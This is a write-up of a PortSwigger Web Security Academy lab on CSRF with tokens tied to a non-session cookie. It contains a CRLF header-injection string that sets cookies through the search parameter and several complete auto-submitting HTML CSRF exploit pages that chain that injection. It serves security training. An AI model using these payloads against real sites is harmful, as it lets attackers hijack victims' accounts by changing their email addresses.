# Lab: CSRF where token is tied to non-session cookie

 This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

    wiener:peter
    carlos:montoya

# Step 1 Walk the application's Email reset functionality

I login as wiener, and intercept the request to change email, then send it to repeater:

![image](https://user-images.githubusercontent.com/83407557/210870221-2f12ff26-95c4-4a9a-9664-4369f2e97766.png)

There are three things I want to test with this page, the csrfKey cookie, the session cookie, and the csrf token.

## csrfKey

Deleting most of the csrfKey and sending an invalid value I get a csrf token error:

![image](https://user-images.githubusercontent.com/83407557/210870598-892dfe43-c11e-4b5e-b121-d6d6da128f69.png)

## session cookie

Doing the same for the session cookie logs me out:

![image](https://user-images.githubusercontent.com/83407557/210870737-27304240-5d0b-41b1-8f0a-047e4aa1dc61.png)

## csrf token

And then testing the csrf token, I get the same csrf token error as with the csrfKey cookie:

![image](https://user-images.githubusercontent.com/83407557/210870993-1c67e807-4b64-40b1-a032-358967437bc8.png)

This tells me that the csrf token and key are not tied to the session

# Step 2 see if the csrf Key and Token are linked

I want to see if adding just the csrf token from another user, but with my current csrfKey cookie will error, if not they are not tied together and a simple CSRF attack is possible:

## Grab carlos csrf token 

I login to carlos in a private window and capture the change email request with burp

![image](https://user-images.githubusercontent.com/83407557/210871827-192638ad-e4c6-4a37-bc1e-5f5079e10f2d.png)

I then go back to repeater and use carlos' csrf token for wiener's request with a different csrfKey

![image](https://user-images.githubusercontent.com/83407557/210872135-e719b198-675d-4f38-8975-02d82aade540.png)

This tells me that the csrf token and key are linked, so I need to chain another attack to set a cookie for the victim in conjunction to the csrf attack.

# Step 3 HTTP header attack

I find a way to set a cookie within the search function of the webapp:

![image](https://user-images.githubusercontent.com/83407557/210872789-f3b76553-3f4b-490c-8cbe-61ad7235aad0.png)


Note that before I perform a search I have 2 cookies set, session and csrfKey:

![image](https://user-images.githubusercontent.com/83407557/210872686-6af26c5c-cd8e-4e7b-9441-b5a04ce1afc8.png)

However after I perform a search:

![image](https://user-images.githubusercontent.com/83407557/210872895-d76b7625-97c7-4872-922f-8a5f4f66d6c9.png)

I have a new cookie set 

![image](https://user-images.githubusercontent.com/83407557/210873066-d6db1529-e817-4523-91d4-95da74c36efd.png)

## Try and set a cookie called hacks

I capture the search function again with burp

![image](https://user-images.githubusercontent.com/83407557/210873595-cdbc75ab-9dc7-4579-9a9c-b04b9c270af0.png)

to try and add a new cookie called hacks I use the following:

```
%0d%0aSet-Cookie:%20hacks=hacked
```

![image](https://user-images.githubusercontent.com/83407557/210873920-b43c236a-93ee-4b53-b3fa-a5e7c5156090.png)

I see that I was able to set a cookie using a the search feature:

![image](https://user-images.githubusercontent.com/83407557/210874180-b1286e81-accc-4476-adc8-2f023ece4824.png)

# Step 4 CSRF POC

Going back to repeater, I send the request I had been testing to CSRF POC generator:

![image](https://user-images.githubusercontent.com/83407557/210874478-28194255-48c3-4dbe-8a86-5eb00bfc67fe.png)

Under options I add the auto-submit scrip and hit regenerate:

![image](https://user-images.githubusercontent.com/83407557/210874653-76a60ac5-b0f2-4b52-9b87-493f48259cf5.png)

I change the email to test2@test.com, and instead of a script I use an invalid img tag that will use the found header attack to set a cookie and on error perform the script action:

**Without header attack**
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a11008a04b518cbc1444a5600650022.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test2&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="8ymDx91k6ZMvNjeOmogE61ppqQbYTyXm" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**With header attack**
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a11008a04b518cbc1444a5600650022.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test2&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="8ymDx91k6ZMvNjeOmogE61ppqQbYTyXm" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a11008a04b518cbc1444a5600650022.web-security-academy.net/?search=hacks%0d%0aSet-Cookie:%20csrfKey=MAWxzPiauewxYjGNyiH10lQ0Lg7RykzS" onerror="document.forms[0].submit()">
  </body>
</html>
```

# Step 5 Host exploit on attack server

I add this chained payload to the body of /exploit on my attack server and save it:

![image](https://user-images.githubusercontent.com/83407557/210876335-be5f8d53-9528-4144-b266-963e2bcb97e1.png)

When I view the exploit I see that my email is changed to test2@test.com:

![image](https://user-images.githubusercontent.com/83407557/210876424-8a871d79-eee5-4af9-afce-037db9ebd895.png)

# Step 6 send exploit to victim

Now that I know that the exploit works against my account, and that the token and key are not tied to a session, I send the exploit to the target victim:

![image](https://user-images.githubusercontent.com/83407557/210876566-b13b0b7b-1c47-40ef-891a-e5dce258ef2d.png)

This fails, so I capture another change email request:

![image](https://user-images.githubusercontent.com/83407557/210877045-c2cfb759-9cf9-499a-b68b-b9da7c3de7bc.png)

and update the exploit with these csrfKey and token values

csrf=XfMQOGK3ujqJfIWNnxxTBZMeb1OUZuGn
csrfKey=Yyuxj9UTnZflhf9y1FTQlERcfSWEt1Db

![image](https://user-images.githubusercontent.com/83407557/210877447-7ccf015c-f21f-480c-a89c-27130ed33324.png)

I found that I had to add the following line to the payload to get it to work correctly:
`%3b%20SameSite=None`

![image](https://user-images.githubusercontent.com/83407557/210879021-36f11c9d-470c-42b4-8bfc-0870bcaeb479.png)

Making the payload:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a11008a04b518cbc1444a5600650022.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test2&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="XfMQOGK3ujqJfIWNnxxTBZMeb1OUZuGn" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a11008a04b518cbc1444a5600650022.web-security-academy.net/?search=hacks%0d%0aSet-Cookie:%20csrfKey=Yyuxj9UTnZflhf9y1FTQlERcfSWEt1Db%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

And solves the lab:

![image](https://user-images.githubusercontent.com/83407557/210879112-1781a6b3-64ac-4c46-a5a9-009bf7c0e861.png)

